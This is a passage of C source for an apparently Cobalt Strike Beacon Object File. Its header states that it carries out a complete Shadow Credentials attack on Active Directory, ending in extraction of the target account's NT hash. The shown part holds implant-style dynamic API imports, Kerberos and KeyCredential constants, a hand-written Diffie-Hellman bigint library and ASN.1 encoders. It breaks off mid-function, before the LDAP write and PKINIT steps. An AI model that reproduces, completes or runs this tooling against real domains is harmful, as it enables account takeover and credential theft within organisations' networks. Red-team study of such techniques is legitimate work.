/*
 * Shadow Credentials BOF - Complete Attack Chain
 *
 * Complete attack chain in a single BOF:
 * 1. Generate RSA keypair and self-signed certificate with UPN/SID
 * 2. Build KeyCredential blob (msDS-KeyCredentialLink format)
 * 3. Write to target's msDS-KeyCredentialLink via LDAP
 * 4. PKINIT - Authenticate to KDC using the certificate
 * 5. UnPAC-the-hash - Extract NT hash from PAC credentials
 *
 * Author: Based on SpicyAD, @_RayRT
 * References: Whisker, DSInternals, Rubeus..
 */

#ifndef STANDALONE
#ifndef BOF
#define BOF
#endif
#endif

/* Verbose output control */
#define VERBOSE 0

/* Prevent winsock.h/winsock2.h conflict */
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

/* Use old-style swprintf (no size parameter) for MSVC compatibility */
#define _CRT_NON_CONFORMING_SWPRINTFS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#include <winldap.h>
#include <dsgetdc.h>
#include <lm.h>
#include <time.h>

#ifdef BOF
/* BOF mode - minimal headers, use DFR for everything */

/* COM type definitions for BOF mode - must be before beacon.h */
typedef void* LPUNKNOWN;
typedef WCHAR OLECHAR;
typedef OLECHAR* LPOLESTR;
typedef OLECHAR* BSTR;
typedef LONG DISPID;
typedef unsigned int UINT;

#define CLSCTX_INPROC_SERVER 0x1

#include "../include/beacon.h"
#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR 0x0d

#else
/* Standalone mode - full headers */
#include <sddl.h>
#include <objbase.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "wldap32.lib")
#define BeaconPrintf(t, fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#endif

/* Use wsprintfW from user32.dll - works in both BOF and standalone */
#ifdef BOF
DECLSPEC_IMPORT int WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
#define SWPRINTF USER32$wsprintfW
#else
#define SWPRINTF wsprintfW
#endif

/*
 * =============================================================================
 * Constants - KeyCredential Entry Types (MS-ADTS)
 * =============================================================================
 */

#define KCEI_VERSION        0x00
#define KCEI_KEYID          0x01
#define KCEI_KEYHASH        0x02
#define KCEI_KEYMATERIAL    0x03
#define KCEI_KEYUSAGE       0x04
#define KCEI_KEYSOURCE      0x05
#define KCEI_DEVICEID       0x06
#define KCEI_CUSTOMKEYINFO  0x07
#define KCEI_KEYLASTLOGON   0x08
#define KCEI_KEYCREATION    0x09

#define KEY_USAGE_NGC       0x01
#define KEY_USAGE_FIDO      0x07
#define KEY_SOURCE_AD       0x00
#define KEY_SOURCE_AZUREAD  0x01

/* Kerberos Message Types */
#define KRB_AS_REQ      10
#define KRB_AS_REP      11
#define KRB_ERROR       30

/* PA-DATA Types */
#define PA_PK_AS_REQ    16
#define PA_PK_AS_REP    17
#define PA_PAC_CREDENTIALS 167

/* Encryption Types */
#define ETYPE_AES256_CTS_HMAC_SHA1  18
#define ETYPE_AES128_CTS_HMAC_SHA1  17
#define ETYPE_RC4_HMAC              23

/* Key Usage */
#define KRB_KEY_USAGE_AS_REP_ENCPART    3
#define KRB_KEY_USAGE_PAC_CREDENTIAL    16
#define KRB_KEY_USAGE_TGS_REQ_AUTH_CKSUM    6
#define KRB_KEY_USAGE_TGS_REQ_AUTH          7
#define KRB_KEY_USAGE_TGS_REP_ENCPART_SESSKEY 8
#define KRB_KEY_USAGE_TICKET_ENCPART        2

/* LDAP constants */
#ifndef LDAP_PORT
#define LDAP_PORT 389
#endif
#ifndef LDAP_SCOPE_SUBTREE
#define LDAP_SCOPE_SUBTREE 0x02
#endif
#ifndef LDAP_AUTH_NEGOTIATE
#define LDAP_AUTH_NEGOTIATE 0x0486
#endif
#ifndef LDAP_OPT_REFERRALS
#define LDAP_OPT_REFERRALS 0x08
#endif
#ifndef LDAP_SUCCESS
#define LDAP_SUCCESS 0x00
#endif
#ifndef LDAP_MOD_ADD
#define LDAP_MOD_ADD 0x00
#endif
#ifndef LDAP_MOD_BVALUES
#define LDAP_MOD_BVALUES 0x80
#endif

/* BCRYPT_RSAKEY_BLOB magic */
#define BCRYPT_RSAPUBLIC_MAGIC  0x31415352  /* "RSA1" */

/* MODP Group 2 - 1024 bit DH parameters (RFC 2409) */
static const BYTE DH_P_MODP2[] = {
    0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
    0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
    0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74,
    0x02, 0x0B, 0xBE, 0xA6, 0x3B, 0x13, 0x9B, 0x22,
    0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
    0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B,
    0x30, 0x2B, 0x0A, 0x6D, 0xF2, 0x5F, 0x14, 0x37,
    0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
    0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6,
    0xF4, 0x4C, 0x42, 0xE9, 0xA6, 0x37, 0xED, 0x6B,
    0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
    0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5,
    0xAE, 0x9F, 0x24, 0x11, 0x7C, 0x4B, 0x1F, 0xE6,
    0x49, 0x28, 0x66, 0x51, 0xEC, 0xE6, 0x53, 0x81,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};
static const BYTE DH_G_MODP2[] = { 0x02 };

#define szOID_NT_PRINCIPAL_NAME "1.3.6.1.4.1.311.20.2.3"
#define szOID_PKINIT_AUTHDATA   "1.3.6.1.5.2.3.1"

/* Global state for PKINIT */
static BYTE g_dhPrivateKey[128];
static BYTE g_dhPublicKey[128];
static BYTE g_sessionKey[32];
static BYTE g_replyKey[32];
static int g_nonce;

/* Global state for Shadow Credential cleanup */
static WCHAR* g_wszKeyCredValue = NULL;
static WCHAR g_wszTargetDN[512] = {0};
static char g_szDomain[256] = {0};
static GUID g_deviceId = {0};

/*
 * =============================================================================
 * DFR Declarations
 * =============================================================================
 */

#ifdef BOF

/* Winsock */
DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
DECLSPEC_IMPORT int WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET, const char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET, char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT struct hostent* WSAAPI WS2_32$gethostbyname(const char*);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$inet_addr(const char*);
DECLSPEC_IMPORT unsigned short WSAAPI WS2_32$htons(unsigned short);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$htonl(unsigned long);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$ntohl(unsigned long);

/* Crypto - ADVAPI32 */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptAcquireContextW(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptReleaseContext(HCRYPTPROV, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGenKey(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyKey(HCRYPTKEY);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGenRandom(HCRYPTPROV, DWORD, BYTE*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptCreateHash(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptHashData(HCRYPTHASH, const BYTE*, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGetHashParam(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyHash(HCRYPTHASH);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptExportKey(HCRYPTKEY, HCRYPTKEY, DWORD, DWORD, BYTE*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$IsValidSid(PSID);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID);

/* Crypto - CRYPT32 */
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptEncodeObjectEx(DWORD, LPCSTR, const void*, DWORD, PCRYPT_ENCODE_PARA, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptDecodeObjectEx(DWORD, LPCSTR, const BYTE*, DWORD, DWORD, PCRYPT_DECODE_PARA, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptBinaryToStringA(const BYTE*, DWORD, DWORD, LPSTR, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertStrToNameA(DWORD, LPCSTR, DWORD, void*, BYTE*, DWORD*, LPCSTR*);
DECLSPEC_IMPORT PCCERT_CONTEXT WINAPI CRYPT32$CertCreateCertificateContext(DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertFreeCertificateContext(PCCERT_CONTEXT);
DECLSPEC_IMPORT HCERTSTORE WINAPI CRYPT32$CertOpenStore(LPCSTR, DWORD, HCRYPTPROV_LEGACY, DWORD, const void*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertCloseStore(HCERTSTORE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertAddCertificateContextToStore(HCERTSTORE, PCCERT_CONTEXT, DWORD, PCCERT_CONTEXT*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertSetCertificateContextProperty(PCCERT_CONTEXT, DWORD, DWORD, const void*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$PFXExportCertStoreEx(HCERTSTORE, CRYPT_DATA_BLOB*, LPCWSTR, void*, DWORD);
DECLSPEC_IMPORT HCERTSTORE WINAPI CRYPT32$PFXImportCertStore(CRYPT_DATA_BLOB*, LPCWSTR, DWORD);
DECLSPEC_IMPORT PCCERT_CONTEXT WINAPI CRYPT32$CertEnumCertificatesInStore(HCERTSTORE, PCCERT_CONTEXT);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptAcquireCertificatePrivateKey(PCCERT_CONTEXT, DWORD, void*, HCRYPTPROV_OR_NCRYPT_KEY_HANDLE*, DWORD*, BOOL*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptExportPublicKeyInfo(HCRYPTPROV, DWORD, DWORD, PCERT_PUBLIC_KEY_INFO, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptSignAndEncodeCertificate(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE, DWORD, DWORD, LPCSTR, const void*, PCRYPT_ALGORITHM_IDENTIFIER, const void*, BYTE*, DWORD*);
DECLSPEC_IMPORT HCRYPTMSG WINAPI CRYPT32$CryptMsgOpenToEncode(DWORD, DWORD, DWORD, const void*, LPSTR, PCMSG_STREAM_INFO);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgUpdate(HCRYPTMSG, const BYTE*, DWORD, BOOL);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgGetParam(HCRYPTMSG, DWORD, DWORD, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgClose(HCRYPTMSG);

/* COM */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateGuid(GUID*);

/* NetAPI */
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, PDOMAIN_CONTROLLER_INFOW*);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

/* LDAP */
DECLSPEC_IMPORT LDAP* WINAPI WLDAP32$ldap_initW(PWSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(LDAP*);
DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PWSTR WINAPI WLDAP32$ldap_get_dnW(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT struct berval** WINAPI WLDAP32$ldap_get_values_lenW(LDAP*, LDAPMessage*, PWSTR);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_value_free_len(struct berval**);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_set_optionW(LDAP*, int, const void*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_modify_sW(LDAP*, PWSTR, LDAPModW**);
DECLSPEC_IMPORT void WINAPI WLDAP32$ldap_memfreeW(PWSTR);

/* Kernel32 */
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT void WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME);
DECLSPEC_IMPORT void WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

/* MSVCRT */
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT int __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcpy(char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcat(char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strchr(const char*, int);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$_stricmp(const char*, const char*);
DECLSPEC_IMPORT int __cdecl MSVCRT$rand(void);
DECLSPEC_IMPORT void __cdecl MSVCRT$srand(unsigned int);
DECLSPEC_IMPORT time_t __cdecl MSVCRT$time(time_t*);

/* DFR macros */
#define WSAStartup WS2_32$WSAStartup
#define WSACleanup WS2_32$WSACleanup
#define socket WS2_32$socket
#define connect WS2_32$connect
#define send WS2_32$send
#define recv WS2_32$recv
#define closesocket WS2_32$closesocket
#define gethostbyname WS2_32$gethostbyname
#define inet_addr WS2_32$inet_addr
#define htons WS2_32$htons
#define htonl WS2_32$htonl
#define ntohl WS2_32$ntohl

#define CryptAcquireContextW ADVAPI32$CryptAcquireContextW
#define CryptReleaseContext ADVAPI32$CryptReleaseContext
#define CryptGenKey ADVAPI32$CryptGenKey
#define CryptDestroyKey ADVAPI32$CryptDestroyKey
#define CryptGenRandom ADVAPI32$CryptGenRandom
#define CryptCreateHash ADVAPI32$CryptCreateHash
#define CryptHashData ADVAPI32$CryptHashData
#define CryptGetHashParam ADVAPI32$CryptGetHashParam
#define CryptDestroyHash ADVAPI32$CryptDestroyHash
#define CryptExportKey ADVAPI32$CryptExportKey
#define ConvertSidToStringSidA ADVAPI32$ConvertSidToStringSidA
#define IsValidSid ADVAPI32$IsValidSid
#define GetLengthSid ADVAPI32$GetLengthSid

#define CryptEncodeObjectEx CRYPT32$CryptEncodeObjectEx
#define CryptDecodeObjectEx CRYPT32$CryptDecodeObjectEx
#define CryptBinaryToStringA CRYPT32$CryptBinaryToStringA
#define CryptStringToBinaryA CRYPT32$CryptStringToBinaryA
#define CertStrToNameA CRYPT32$CertStrToNameA
#define CertCreateCertificateContext CRYPT32$CertCreateCertificateContext
#define CertFreeCertificateContext CRYPT32$CertFreeCertificateContext
#define CertOpenStore CRYPT32$CertOpenStore
#define CertCloseStore CRYPT32$CertCloseStore
#define CertAddCertificateContextToStore CRYPT32$CertAddCertificateContextToStore
#define CertSetCertificateContextProperty CRYPT32$CertSetCertificateContextProperty
#define PFXExportCertStoreEx CRYPT32$PFXExportCertStoreEx
#define PFXImportCertStore CRYPT32$PFXImportCertStore
#define CertEnumCertificatesInStore CRYPT32$CertEnumCertificatesInStore
#define CryptAcquireCertificatePrivateKey CRYPT32$CryptAcquireCertificatePrivateKey
#define CryptExportPublicKeyInfo CRYPT32$CryptExportPublicKeyInfo
#define CryptSignAndEncodeCertificate CRYPT32$CryptSignAndEncodeCertificate
#define CryptMsgOpenToEncode CRYPT32$CryptMsgOpenToEncode
#define CryptMsgUpdate CRYPT32$CryptMsgUpdate
#define CryptMsgGetParam CRYPT32$CryptMsgGetParam
#define CryptMsgClose CRYPT32$CryptMsgClose

#define CoInitializeEx OLE32$CoInitializeEx
#define CoUninitialize OLE32$CoUninitialize
#define CoCreateGuid OLE32$CoCreateGuid

#define DsGetDcNameW NETAPI32$DsGetDcNameW
#define NetApiBufferFree NETAPI32$NetApiBufferFree

#define ldap_initW WLDAP32$ldap_initW
#define ldap_bind_sW WLDAP32$ldap_bind_sW
#define ldap_search_sW WLDAP32$ldap_search_sW
#define ldap_unbind WLDAP32$ldap_unbind
#define ldap_first_entry WLDAP32$ldap_first_entry
#define ldap_get_dnW WLDAP32$ldap_get_dnW
#define ldap_get_values_lenW WLDAP32$ldap_get_values_lenW
#define ldap_value_free_len WLDAP32$ldap_value_free_len
#define ldap_msgfree WLDAP32$ldap_msgfree
#define ldap_set_optionW WLDAP32$ldap_set_optionW
#define ldap_modify_sW WLDAP32$ldap_modify_sW
#define ldap_memfreeW WLDAP32$ldap_memfreeW

#define LocalAlloc KERNEL32$LocalAlloc
#define LocalFree KERNEL32$LocalFree
#define LoadLibraryA KERNEL32$LoadLibraryA
#define GetProcAddress KERNEL32$GetProcAddress
#define FreeLibrary KERNEL32$FreeLibrary
#define MultiByteToWideChar KERNEL32$MultiByteToWideChar
#define WideCharToMultiByte KERNEL32$WideCharToMultiByte
#define GetSystemTime KERNEL32$GetSystemTime
#define GetSystemTimeAsFileTime KERNEL32$GetSystemTimeAsFileTime
#define GetLastError KERNEL32$GetLastError

#define malloc MSVCRT$malloc
#define free MSVCRT$free
#define memset MSVCRT$memset
#define memcpy MSVCRT$memcpy
#define memcmp MSVCRT$memcmp
#define strlen MSVCRT$strlen
#define wcslen MSVCRT$wcslen
#define sprintf MSVCRT$sprintf
#define swprintf MSVCRT$swprintf
#define strcpy MSVCRT$strcpy
#define strcat MSVCRT$strcat
#define strchr MSVCRT$strchr
#define wcscpy MSVCRT$wcscpy
#define wcscat MSVCRT$wcscat
#define _stricmp MSVCRT$_stricmp
#define rand MSVCRT$rand
#define srand MSVCRT$srand
#define time MSVCRT$time

#endif /* BOF */

/*
 * =============================================================================
 * cryptdll.dll types for Kerberos decryption
 * =============================================================================
 */

typedef int (WINAPI *CDLocateCSystem_t)(int, void**);
typedef int (WINAPI *CDLocateCheckSum_t)(int, void**);

typedef struct _KERB_ECRYPT {
    int Type0;
    int BlockSize;
    int Type1;
    int KeySize;
    int Size;
    int Type2;
    int Type3;
    void* AlgName;
    void* Initialize;
    void* Encrypt;
    void* Decrypt;
    void* Finish;
    void* HashPassword;
    void* RandomKey;
    void* Control;
} KERB_ECRYPT;

typedef int (WINAPI *KERB_ECRYPT_Initialize)(BYTE* key, int keySize, int keyUsage, void** pContext);
typedef int (WINAPI *KERB_ECRYPT_Decrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
typedef int (WINAPI *KERB_ECRYPT_Encrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
typedef int (WINAPI *KERB_ECRYPT_Finish)(void** pContext);

typedef struct _KERB_CHECKSUM {
    int Type;
    int Size;
    int Flag;
    void* Initialize;
    void* Sum;
    void* Finalize;
    void* Finish;
    void* InitializeEx;
    void* InitializeEx2;
} KERB_CHECKSUM;

typedef int (WINAPI *KERB_CHECKSUM_InitializeEx)(BYTE* key, int keySize, int keyUsage, void** pContext);
typedef int (WINAPI *KERB_CHECKSUM_Sum)(void* pContext, int dataSize, BYTE* data);
typedef int (WINAPI *KERB_CHECKSUM_Finalize)(void* pContext, BYTE* output);
typedef int (WINAPI *KERB_CHECKSUM_Finish)(void** pContext);

#define KERB_CHECKSUM_HMAC_SHA1_96_AES256 16

/*
 * =============================================================================
 * BigInteger Implementation for DH (1024-bit MODP Group 2)
 * =============================================================================
 */

#define BIGINT_WORDS 64
#define DH_BYTES 128
#define DH_WORDS 32

typedef struct {
    DWORD words[BIGINT_WORDS];
    int len;
} BigInt;

static void bigint_zero(BigInt* n) {
    memset(n->words, 0, sizeof(n->words));
    n->len = 1;
}

static void bigint_from_bytes(BigInt* n, const BYTE* data, int dataLen) {
    int i;
    bigint_zero(n);
    for (i = 0; i < dataLen && i < DH_BYTES; i++) {
        int bytePos = dataLen - 1 - i;
        int wordIdx = i / 4;
        int byteIdx = i % 4;
        n->words[wordIdx] |= ((DWORD)data[bytePos]) << (byteIdx * 8);
    }
    n->len = (dataLen + 3) / 4;
    while (n->len > 1 && n->words[n->len - 1] == 0) n->len--;
}

static void bigint_to_bytes(BigInt* n, BYTE* out, int outLen) {
    int i;
    memset(out, 0, outLen);
    for (i = 0; i < outLen && i < n->len * 4; i++) {
        int wordIdx = i / 4;
        int byteIdx = i % 4;
        out[outLen - 1 - i] = (BYTE)(n->words[wordIdx] >> (byteIdx * 8));
    }
}

static int bigint_cmp(BigInt* a, BigInt* b) {
    int i;
    int maxLen = (a->len > b->len) ? a->len : b->len;
    for (i = maxLen - 1; i >= 0; i--) {
        DWORD aw = (i < a->len) ? a->words[i] : 0;
        DWORD bw = (i < b->len) ? b->words[i] : 0;
        if (aw > bw) return 1;
        if (aw < bw) return -1;
    }
    return 0;
}

static void bigint_sub(BigInt* result, BigInt* a, BigInt* b) {
    int i;
    LONGLONG borrow = 0;
    for (i = 0; i < a->len; i++) {
        LONGLONG diff = (LONGLONG)a->words[i] - borrow;
        if (i < b->len) diff -= b->words[i];
        if (diff < 0) {
            diff += 0x100000000LL;
            borrow = 1;
        } else {
            borrow = 0;
        }
        result->words[i] = (DWORD)diff;
    }
    result->len = a->len;
    while (result->len > 1 && result->words[result->len - 1] == 0) result->len--;
}

static void bigint_mul(BigInt* result, BigInt* a, BigInt* b) {
    int i, j;
    BigInt temp;
    bigint_zero(&temp);
    for (i = 0; i < a->len; i++) {
        ULONGLONG carry = 0;
        for (j = 0; j < b->len || carry; j++) {
            ULONGLONG prod = temp.words[i + j] + carry;
            if (j < b->len) prod += (ULONGLONG)a->words[i] * b->words[j];
            temp.words[i + j] = (DWORD)prod;
            carry = prod >> 32;
        }
        if (i + j > temp.len) temp.len = i + j;
    }
    while (temp.len > 1 && temp.words[temp.len - 1] == 0) temp.len--;
    memcpy(result, &temp, sizeof(BigInt));
}

static int bigint_get_bit(BigInt* n, int pos) {
    int wordIdx = pos / 32;
    int bitIdx = pos % 32;
    if (wordIdx >= n->len) return 0;
    return (n->words[wordIdx] >> bitIdx) & 1;
}

static int bigint_bit_length(BigInt* n) {
    if (n->len == 0) return 0;
    DWORD top = n->words[n->len - 1];
    int bits = (n->len - 1) * 32;
    while (top) { bits++; top >>= 1; }
    return bits;
}

static void bigint_mod(BigInt* result, BigInt* a, BigInt* p) {
    BigInt temp, shifted_p;
    int shift, i;
    memcpy(&temp, a, sizeof(BigInt));
    while (bigint_cmp(&temp, p) >= 0) {
        int tempBits = bigint_bit_length(&temp);
        int pBits = bigint_bit_length(p);
        shift = tempBits - pBits;
        memcpy(&shifted_p, p, sizeof(BigInt));
        if (shift > 0) {
            int wordShift = shift / 32;
            int bitShift = shift % 32;
            if (wordShift > 0) {
                for (i = shifted_p.len - 1; i >= 0; i--) {
                    if (i + wordShift < BIGINT_WORDS) {
                        shifted_p.words[i + wordShift] = shifted_p.words[i];
                    }
                    shifted_p.words[i] = 0;
                }
                shifted_p.len += wordShift;
            }
            if (bitShift > 0) {
                DWORD carry = 0;
                for (i = 0; i < shifted_p.len; i++) {
                    DWORD newCarry = shifted_p.words[i] >> (32 - bitShift);
                    shifted_p.words[i] = (shifted_p.words[i] << bitShift) | carry;
                    carry = newCarry;
                }
                if (carry) shifted_p.words[shifted_p.len++] = carry;
            }
        }
        if (bigint_cmp(&shifted_p, &temp) > 0) {
            for (i = 0; i < shifted_p.len; i++) {
                shifted_p.words[i] >>= 1;
                if (i + 1 < shifted_p.len) {
                    shifted_p.words[i] |= (shifted_p.words[i + 1] & 1) << 31;
                }
            }
            while (shifted_p.len > 1 && shifted_p.words[shifted_p.len - 1] == 0) shifted_p.len--;
        }
        if (bigint_cmp(&temp, &shifted_p) >= 0) {
            bigint_sub(&temp, &temp, &shifted_p);
        } else {
            break;
        }
    }
    memcpy(result, &temp, sizeof(BigInt));
}

static void bigint_modpow(BigInt* result, BigInt* base, BigInt* exp, BigInt* p) {
    BigInt temp_result, temp_base, temp_mul;
    int i, expBits;
    bigint_zero(&temp_result);
    temp_result.words[0] = 1;
    temp_result.len = 1;
    bigint_mod(&temp_base, base, p);
    expBits = bigint_bit_length(exp);
    for (i = 0; i < expBits; i++) {
        if (bigint_get_bit(exp, i)) {
            bigint_mul(&temp_mul, &temp_result, &temp_base);
            bigint_mod(&temp_result, &temp_mul, p);
        }
        bigint_mul(&temp_mul, &temp_base, &temp_base);
        bigint_mod(&temp_base, &temp_mul, p);
    }
    memcpy(result, &temp_result, sizeof(BigInt));
}

/*
 * =============================================================================
 * ASN.1/DER Encoding Functions
 * =============================================================================
 */

static int EncodeLength(BYTE* buf, int len) {
    if (len < 128) {
        buf[0] = (BYTE)len;
        return 1;
    } else if (len < 256) {
        buf[0] = 0x81;
        buf[1] = (BYTE)len;
        return 2;
    } else if (len < 65536) {
        buf[0] = 0x82;
        buf[1] = (BYTE)(len >> 8);
        buf[2] = (BYTE)(len & 0xFF);
        return 3;
    } else {
        buf[0] = 0x83;
        buf[1] = (BYTE)(len >> 16);
        buf[2] = (BYTE)((len >> 8) & 0xFF);
        buf[3] = (BYTE)(len & 0xFF);
        return 4;
    }
}

static int DecodeLength(BYTE* data, int offset, int* length) {
    if ((data[offset] & 0x80) == 0) {
        *length = data[offset];
        return 1;
    } else {
        int numBytes = data[offset] & 0x7F;
        int i;
        *length = 0;
        for (i = 1; i <= numBytes; i++) {
            *length = (*length << 8) | data[offset + i];
        }
        return 1 + numBytes;
    }
}

static BYTE* BuildSequence(BYTE* content, int contentLen, int* outLen) {
    int lenSize;
    BYTE lenBuf[4];
    BYTE* result;
    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x30;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);
    return result;
}

static BYTE* BuildInteger(int value, int* outLen) {
    BYTE* result;
